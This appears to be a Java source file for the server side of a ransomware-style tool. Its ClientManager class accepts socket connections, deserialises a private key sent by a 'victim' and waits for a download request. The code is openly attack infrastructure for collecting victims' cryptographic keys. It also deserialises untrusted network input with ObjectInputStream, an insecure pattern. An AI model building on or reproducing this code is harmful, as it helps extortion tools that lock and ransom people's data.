package onion.aluka;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.security.PrivateKey;
import java.security.PublicKey;

public class ClientManager implements Runnable {

	private Socket socket;
	private PublicKey publicKey;
	private PrivateKey privateKey;

	public ClientManager(Socket socket,PublicKey publicKey,PrivateKey privateKey) {
		System.out.println("Received");
		this.socket = socket;
		this.publicKey = publicKey;
		this.privateKey = privateKey;
	}

	@Override
	public void run() {
		try {
			System.out.println("[ + ] - Reading key from this client");
			ObjectInputStream privateKeyFromVictim = new ObjectInputStream(socket.getInputStream());
			PrivateKey privateVictimKey = (PrivateKey)privateKeyFromVictim.readObject();
			System.out.println("[ + ] - Waiting Downlaod");
			DataInputStream dis = new DataInputStream(this.socket.getInputStream());
			String request = dis.readUTF();
			
			System.out.println(privateVictimKey);
		} catch (IOException | ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
